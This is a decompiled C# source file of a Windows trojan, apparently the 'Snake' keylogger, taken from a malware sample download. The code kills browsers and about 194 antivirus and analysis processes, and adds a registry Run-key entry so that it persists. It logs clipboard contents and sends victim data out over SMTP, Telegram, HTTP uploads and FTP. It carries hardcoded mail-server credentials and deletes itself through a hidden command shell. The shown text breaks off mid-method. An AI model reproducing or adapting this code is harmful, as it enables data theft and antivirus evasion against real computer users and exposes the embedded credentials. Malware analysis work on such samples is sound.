// Decompiled with JetBrains decompiler
// Type: �˨�Α㠰.ջô�ܣƚ
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-eaa07c9bde4c048e900f10410f38506ecb28371240e38a824e8043477d5e89a5.exe

using \u0026ų\u0609ٷۚ;
using \u0097\u0040ב鈟늻;
using \uFFFD\u02E8\uFFFDΑ㠰;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using ε蠺ی\u0026\uFFFD;

namespace \uFFFD\u02E8\uFFFDΑ㠰
{
  [StandardModule]
  internal sealed class ջô\uFFFDܣƚ
  {
    public static string 뜸Ò\uFFFD\uFFFDŧ;
    public static string \u07B4أ\uFFFD꼺\uFFFD;
    public static string \u1CFCœݝִױ = ".txt";
    private static Process[] ӛ\uFFFDУҏ\u07BB = Process.GetProcesses();
    private static string å\uFFFD̲מ\u0026;
    private static string ϱӓ뫆اչ;
    public static string Α\u0385Ω\uFFFDΠ;
    private static string ɩٗ\uDB8E\uDD61Α;
    private static ջô\uFFFDܣƚ.KeyLogger ǎ\uFFFD\uFFFDã\uFFFD;
    private static StringBuilder Ц\u061D쐬鈟ֵ;
    private static object מO\uFFFD\u002D퓜;
    private static object \u05B4\uDBB0\uDEBAܪ̔;
    private static object \uFFFD2ﾭ콪Α;
    private static string ɇհִӓב;
    private static object ɢ\uFFFDҭܹ2;
    private static string کεҚ蠺Ц;
    private static string \u07B4\uFFFDʓK늻;
    private static string \uDAE4\uDED3\u07B8\uFFFD\uFFFD;
    private static string \u061DƉŲ\uFFFDꓞ;
    private static string W\u2964\uFFFD̲؜;
    private static string \u061D\uFFFD\u0089븤ε;
    private static string ζڿŚŎ\uFFFD;
    private static string 丐\uFFFD\u061D\uFFFD鈟;
    private static string ҡ\uFFFDҏۨɇ;
    private static string ҭAױå\uFFFD;
    private static string \uFFFDşӤ2ٵ;
    private static string Ŕޤ\u26CA\u05C3հ;
    public static string 皍̱\u0097̳ʤ;
    private static object 䇹Ɖôأʓ;

    static ջô\uFFFDܣƚ()
    {
      ջô\uFFFDܣƚ.מɢœ\uFFFDϱ = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.Цʓ\u07B4ņۣ = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.\u07C2\uFFFDKЅē = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.\uDBB0\uDF1AϘ\u26CAܹ = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.\u032EӤK\uFFFDԜ = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.ߡ\uFFFDC\u1CFCأ = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.ζ\uFFFDę\uFFFD븤 = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.\uFFFDi\uFFFD\u002Dܪ = new System.Windows.Forms.Timer();
      ջô\uFFFDܣƚ.ϱӓ뫆اչ = "$%SMTPDV$";
      ջô\uFFFDܣƚ.Α\u0385Ω\uFFFDΠ = "";
      ջô\uFFFDܣƚ.ɩٗ\uDB8E\uDD61Α = "$#TheHashHere%&";
      ջô\uFFFDܣƚ.Ц\u061D쐬鈟ֵ = new StringBuilder();
      ջô\uFFFDܣƚ.מO\uFFFD\u002D퓜 = (object) "False";
      ջô\uFFFDܣƚ.\u05B4\uDBB0\uDEBAܪ̔ = (object) "False";
      ջô\uFFFDܣƚ.\uFFFD2ﾭ콪Α = (object) "False";
      ջô\uFFFDܣƚ.ɇհִӓב = "$ProtectPass%";
      ջô\uFFFDܣƚ.ɢ\uFFFDҭܹ2 = (object) "ProtectFalse";
      ջô\uFFFDܣƚ.کεҚ蠺Ц = "False";
      ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" \r\n\r\nPC Name:" + Environment.MachineName), Operators.AddObject((object) "\r\nDate and Time: ", ջô\uFFFDܣƚ.ҚC鈇ۣŁ())), Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "\r\nClient IP: ", ջô\uFFFDܣƚ.ϫ\u003BŴ\uFFFDε()), (object) "\r\n"), (object) "Country Name: "), ջô\uFFFDܣƚ.ã鈟ӓåW()), (object) "\r\n")));
      ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD = "quartermast@valleycountysar.org";
      ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ = "{-bIzqBk6;HQ";
      ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜ = "mail.valleycountysar.org";
      ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε = "quartermast@valleycountysar.org";
      ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD = "587";
      ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟 = "";
      ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ = "";
      ջô\uFFFDܣƚ.ҭAױå\uFFFD = "";
      ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ = "";
      ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ = "";
      ջô\uFFFDܣƚ.䇹Ɖôأʓ = (object) ("ZyiAEnXWZP" + new Random().Next().ToString());
    }

    public static System.Windows.Forms.Timer מɢœ\uFFFDϱ
    {
      get => ջô\uFFFDܣƚ.\uFFFDņ\uFFFDʤӥ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(ջô\uFFFDܣƚ.\uFFFD쐬퓜\uFFFD\uFFFD);
        System.Windows.Forms.Timer ņʤӥ1 = ջô\uFFFDܣƚ.\uFFFDņ\uFFFDʤӥ;
        if (ņʤӥ1 != null)
          ņʤӥ1.Tick -= eventHandler;
        ջô\uFFFDܣƚ.\uFFFDņ\uFFFDʤӥ = value;
        System.Windows.Forms.Timer ņʤӥ2 = ջô\uFFFDܣƚ.\uFFFDņ\uFFFDʤӥ;
        if (ņʤӥ2 == null)
          return;
        ņʤӥ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer Цʓ\u07B4ņۣ
    {
      get => ջô\uFFFDܣƚ.jсŲ\u07BBٕ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(ջô\uFFFDܣƚ.C\uFFFD\uFFFDױ\uFFFD);
        System.Windows.Forms.Timer jсŲٕ1 = ջô\uFFFDܣƚ.jсŲ\u07BBٕ;
        if (jсŲٕ1 != null)
          jсŲٕ1.Tick -= eventHandler;
        ջô\uFFFDܣƚ.jсŲ\u07BBٕ = value;
        System.Windows.Forms.Timer jсŲٕ2 = ջô\uFFFDܣƚ.jсŲ\u07BBٕ;
        if (jсŲٕ2 == null)
          return;
        jсŲٕ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer \u07C2\uFFFDKЅē
    {
      get => ջô\uFFFDܣƚ.똛j\uFFFD\u0089ߟ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(ջô\uFFFDܣƚ.늻\uFFFDʤ콪Ц);
        System.Windows.Forms.Timer 똛jߟ1 = ջô\uFFFDܣƚ.똛j\uFFFD\u0089ߟ;
        if (똛jߟ1 != null)
          똛jߟ1.Tick -= eventHandler;
        ջô\uFFFDܣƚ.똛j\uFFFD\u0089ߟ = value;
        System.Windows.Forms.Timer 똛jߟ2 = ջô\uFFFDܣƚ.똛j\uFFFD\u0089ߟ;
        if (똛jߟ2 == null)
          return;
        똛jߟ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer \uDBB0\uDF1AϘ\u26CAܹ
    {
      get => ջô\uFFFDܣƚ.恁ƉŴӛt;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(ջô\uFFFDܣƚ.\uFFFDɇ̲쐬뜸);
        System.Windows.Forms.Timer 恁Ɖŵӛt1 = ջô\uFFFDܣƚ.恁ƉŴӛt;
        if (恁Ɖŵӛt1 != null)
          恁Ɖŵӛt1.Tick -= eventHandler;
        ջô\uFFFDܣƚ.恁ƉŴӛt = value;
        System.Windows.Forms.Timer 恁Ɖŵӛt2 = ջô\uFFFDܣƚ.恁ƉŴӛt;
        if (恁Ɖŵӛt2 == null)
          return;
        恁Ɖŵӛt2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("kLLTIm")]
    public static System.Windows.Forms.Timer \u032EӤK\uFFFDԜ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static System.Windows.Forms.Timer ߡ\uFFFDC\u1CFCأ
    {
      get => ջô\uFFFDܣƚ.ٵ\uFFFD츠z츠;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(ջô\uFFFDܣƚ.ēƉ\u26CAٚë);
        System.Windows.Forms.Timer ٵ츠z츠1 = ջô\uFFFDܣƚ.ٵ\uFFFD츠z츠;
        if (ٵ츠z츠1 != null)
          ٵ츠z츠1.Tick -= eventHandler;
        ջô\uFFFDܣƚ.ٵ\uFFFD츠z츠 = value;
        System.Windows.Forms.Timer ٵ츠z츠2 = ջô\uFFFDܣƚ.ٵ\uFFFD츠z츠;
        if (ٵ츠z츠2 == null)
          return;
        ٵ츠z츠2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer ζ\uFFFDę\uFFFD븤
    {
      get => ջô\uFFFDܣƚ.\uFFFDǎɢ\uFFFD\uFFFD;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(ջô\uFFFDܣƚ.\uFFFD̲2\uFFFDj);
        System.Windows.Forms.Timer ǎɢ1 = ջô\uFFFDܣƚ.\uFFFDǎɢ\uFFFD\uFFFD;
        if (ǎɢ1 != null)
          ǎɢ1.Tick -= eventHandler;
        ջô\uFFFDܣƚ.\uFFFDǎɢ\uFFFD\uFFFD = value;
        System.Windows.Forms.Timer ǎɢ2 = ջô\uFFFDܣƚ.\uFFFDǎɢ\uFFFD\uFFFD;
        if (ǎɢ2 == null)
          return;
        ǎɢ2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("ProHfutimer")]
    public static System.Windows.Forms.Timer \uFFFDi\uFFFD\u002Dܪ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static void \u07B8̆ɮٷڿ()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (ջô\uFFFDܣƚ.ӛ\uFFFDУҏ\u07BB.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(ջô\uFFFDܣƚ.ӛ\uFFFDУҏ\u07BB[index].ProcessName), "chrome", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        ջô\uFFFDܣƚ.ӛ\uFFFDУҏ\u07BB[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void εζé\uFFFDک()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (ջô\uFFFDܣƚ.ӛ\uFFFDУҏ\u07BB.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(ջô\uFFFDܣƚ.ӛ\uFFFDУҏ\u07BB[index].ProcessName), "firefox", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        ջô\uFFFDܣƚ.ӛ\uFFFDУҏ\u07BB[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void \u07A8퓜恁cē()
    {
      string[] strArray1 = new string[194]
      {
        "zlclient",
        "egui",
        "bdagent",
        "npfmsg",
        "olydbg",
        "anubis",
        "wireshark",
        "avastui",
        "_Avp32",
        "vsmon",
        "mbam",
        "keyscrambler",
        "_Avpcc",
        "_Avpm",
        "Ackwin32",
        "Outpost",
        "Anti-Trojan",
        "ANTIVIR",
        "Apvxdwin",
        "ATRACK",
        "Autodown",
        "Avconsol",
        "Ave32",
        "Avgctrl",
        "Avkserv",
        "Avnt",
        "Avp",
        "Avp32",
        "Avpcc",
        "Avpdos32",
        "Avpm",
        "Avptc32",
        "Avpupd",
        "Avsched32",
        "AVSYNMGR",
        "Avwin95",
        "Avwupd32",
        "Blackd",
        "Blackice",
        "Cfiadmin",
        "Cfiaudit",
        "Cfinet",
        "Cfinet32",
        "Claw95",
        "Claw95cf",
        "Cleaner",
        "Cleaner3",
        "Defwatch",
        "Dvp95",
        "Dvp95_0",
        "Ecengine",
        "Esafe",
        "Espwatch",
        "F-Agnt95",
        "Findviru",
        "Fprot",
        "F-Prot",
        "F-Prot95",
        "Fp-Win",
        "Frw",
        "F-Stopw",
        "Iamapp",
        "Iamserv",
        "Ibmasn",
        "Ibmavsp",
        "Icload95",
        "Icloadnt",
        "Icmon",
        "Icsupp95",
        "Icsuppnt",
        "Iface",
        "Iomon98",
        "Jedi",
        "Lockdown2000",
        "Lookout",
        "Luall",
        "MCAFEE",
        "Moolive",
        "Mpftray",
        "N32scanw",
        "NAVAPSVC",
        "NAVAPW32",
        "NAVLU32",
        "Navnt",
        "NAVRUNR",
        "Navw32",
        "Navwnt",
        "NeoWatch",
        "NISSERV",
        "Nisum",
        "Nmain",
        "Normist",
        "NORTON",
        "Nupgrade",
        "Nvc95",
        "Outpost",
        "Padmin",
        "Pavcl",
        "Pavsched",
        "Pavw",
        "PCCIOMON",
        "PCCMAIN",
        "Pccwin98",
        "Pcfwallicon",
        "Persfw",
        "POP3TRAP",
        "PVIEW95",
        "Rav7",
        "Rav7win",
        "Rescue",
        "Safeweb",
        "Scan32",
        "Scan95",
        "Scanpm",
        "Scrscan",
        "Serv95",
        "Smc",
        "SMCSERVICE",
        "Snort",
        "Sphinx",
        "Sweep95",
        "SYMPROXYSVC",
        "Tbscan",
        "Tca",
        "Tds2-98",
        "Tds2-Nt",
        "TermiNET",
        "Vet95",
        "Vettray",
        "Vscan40",
        "Vsecomr",
        "Vshwin32",
        "Vsstat",
        "Webscanx",
        "WEBTRAP",
        "Wfindv32",
        "Zonealarm",
        "LOCKDOWN2000",
        "RESCUE32",
        "LUCOMSERVER",
        "avgcc",
        "avgcc",
        "avgamsvr",
        "avgupsvc",
        "avgw",
        "avgcc32",
        "avgserv",
        "avgserv9",
        "avgserv9schedapp",
        "avgemc",
        "ashwebsv",
        "ashdisp",
        "ashmaisv",
        "ashserv",
        "aswUpdSv",
        "symwsc",
        "norton",
        "Norton Auto-Protect",
        "norton_av",
        "nortonav",
        "ccsetmgr",
        "ccevtmgr",
        "avadmin",
        "avcenter",
        "avgnt",
        "avguard",
        "avnotify",
        "avscan",
        "guardgui",
        "nod32krn",
        "nod32kui",
        "clamscan",
        "clamTray",
        "clamWin",
        "freshclam",
        "oladdin",
        "sigtool",
        "w9xpopen",
        "Wclose",
        "cmgrdian",
        "alogserv",
        "mcshield",
        "vshwin32",
        "avconsol",
        "vsstat",
        "avsynmgr",
        "avcmd",
        "avconfig",
        "licmgr",
        "sched",
        "preupd",
        "MsMpEng",
        "MSASCui",
        "Avira.Systray"
      };
      Process[] processes = Process.GetProcesses();
      int index1 = 0;
      while (index1 < processes.Length)
      {
        Process process = processes[index1];
        string[] strArray2 = strArray1;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string Right = strArray2[index2];
          if (Operators.CompareString(process.ProcessName, Right, false) == 0)
          {
            process.Kill();
            break;
          }
          checked { ++index2; }
        }
        checked { ++index1; }
      }
    }

    public static object \u00ABŎε쐬\uFFFD(string _param0)
    {
      if (Process.GetProcessesByName(_param0).Length > 0)
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static object \uFFFD\uFFFDkﾭΩ(string ēӛӺ؜Ԍ)
    {
      if (System.IO.File.Exists(ēӛӺ؜Ԍ))
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static string Թꓞ\uFFFD퓜ӥ(string _param0)
    {
      SHA256 shA256 = SHA256.Create();
      FileStream inputStream = System.IO.File.OpenRead(_param0);
      inputStream.Position = 0L;
      byte[] hash = shA256.ComputeHash((Stream) inputStream);
      inputStream.Close();
      string str = "";
      int num = checked (hash.Length - 1);
      int index = 0;
      while (index <= num)
      {
        str += hash[index].ToString("X2");
        checked { ++index; }
      }
      return str.ToLower();
    }

    public static void \u0097ՄŴ\uFFFD\uFFFD()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        });
        Environment.Exit(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFD\u05C3콪쐬\uFFFD(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ʤۨӺ\uFFFD\uFFFD(uint _param0);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFDި\u07BBΑݶ([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long _param2);

    public static void ӛ̧恁Ϙ\uFFFD()
    {
    }

    public static void \uFFFDԜ\u00BEŁک(string _param0, string _param1)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue(_param0, (object) _param1, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ɩ\uFFFD쐬\uFFFDՄ(
      string _param0,
      string ȨƌŚ嵱恁,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) ȨƌŚ嵱恁, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \u05C1ϒ2\u060C\uFFFD(
      string _param0,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void i\u02E8R鈟\uFFFD(
      string _param0,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \u060CޗأҚζ(byte[] _param0, string _param1, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = webClient.Encoding.GetString(_param0);
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param1, (object) _param2, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param3, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ɖ盀؜ӓ\uFFFD(string ҭթΩήٷ, string _param1, string _param2)
    {
      try
      {
        string requestUriString = "https://api.telegram.org/bot" + ҭթΩήٷ + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
        ServicePointManager.Expect100Continue = false;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        string empty = string.Empty;
        try
        {
          using (Stream responseStream = httpWebRequest.GetResponse().GetResponseStream())
            new StreamReader(responseStream, Encoding.UTF8).ReadToEnd();
        }
        catch (WebException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          WebException webException = ex;
          empty = webException.Message.ToString();
          using (Stream responseStream = webException.Response.GetResponseStream())
            new StreamReader(responseStream, Encoding.GetEncoding("utf-8")).ReadToEnd();
          throw;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string \u0306\u005E\uFFFDΑ蠺(string _param0, string _param1)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      byte[] destinationArray = new byte[8];
      Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(_param1)), 0, (Array) destinationArray, 0, 8);
      cryptoServiceProvider1.Key = destinationArray;
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
      byte[] bytes = Encoding.ASCII.GetBytes(_param0);
      return Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
    }

    public static object \uFFFD\uF0B9ƌɇЅ()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) (Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0)))) + " GB");
    }

    public static object ҚC鈇ۣŁ() => (object) (Conversions.ToString(DateAndTime.Today) + " / " + Conversions.ToString(DateAndTime.TimeOfDay));

    public static object ޤƌӥ嵱Ӻ() => (object) 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Info.OSFullName;

    public static object \uFFFDհ皍㹃\uFFFD() => (object) 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Info.OSVersion;

    public static object ջ콪Ц\uFFFDٕ() => (object) string.Format("{0:f2} GB", (object) ((double) 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Info.TotalPhysicalMemory / 1073741824.0));

    public static object ϫ\u003BŴ\uFFFDε()
    {
      WebClient webClient = new WebClient();
      webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
      string address = "http://checkip.dyndns.org/";
      IWebProxy systemWebProxy = WebRequest.GetSystemWebProxy();
      systemWebProxy.Credentials = (ICredentials) CredentialCache.DefaultNetworkCredentials;
      webClient.Proxy = systemWebProxy;
      Stream stream;
      try
      {
        stream = webClient.OpenRead(address);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      StreamReader streamReader = new StreamReader(stream);
      string end = streamReader.ReadToEnd();
      stream.Close();
      streamReader.Close();
      return (object) end.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "").ToString();
    }

    public static object ã鈟ӓåW()
    {
      XmlDocument Instance = new XmlDocument();
      object obj = Operators.AddObject((object) "https://freegeoip.app/xml/", ջô\uFFFDܣƚ.ϫ\u003BŴ\uFFFDε());
      object[] objArray;
      bool[] flagArray;
      NewLateBinding.LateCall((object) Instance, (System.Type) null, "Load", objArray = new object[1]
      {
        obj
      }, (string[]) null, (System.Type[]) null, flagArray = new bool[1]
      {
        true
      }, true);
      if (flagArray[0])
        RuntimeHelpers.GetObjectValue(objArray[0]);
      XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
      string str = "";
      try
      {
        foreach (XmlElement xmlElement in elementsByTagName)
          str = xmlElement.InnerText;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return (object) str;
    }

    public static byte[] ӥҡۚή\uFFFD() => Encoding.Unicode.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n\r\n\r\n" + ջô\uFFFDܣƚ.Α\u0385Ω\uFFFDΠ + "\r\n\r\n--------------------------------------------------");

    public static void 늻\uFFFDʤ콪Ц(object _param0, EventArgs _param1)
    {
      if (ջô\uFFFDܣƚ.Α\u0385Ω\uFFFDΠ.ToString().Contains(恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>")))
        return;
      ջô\uFFFDܣƚ.Α\u0385Ω\uFFFDΠ = ջô\uFFFDܣƚ.Α\u0385Ω\uFFFDΠ + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>") + "\r\n";
    }

    public static void \uFFFDɇ̲쐬뜸(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (ջô\uFFFDܣƚ.ҭAױå\uFFFD + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Name + " - Clipboard Logs ID - "), ջô\uFFFDܣƚ.䇹Ɖôأʓ), (object) ջô\uFFFDܣƚ.\u1CFCœݝִױ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟, ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ);
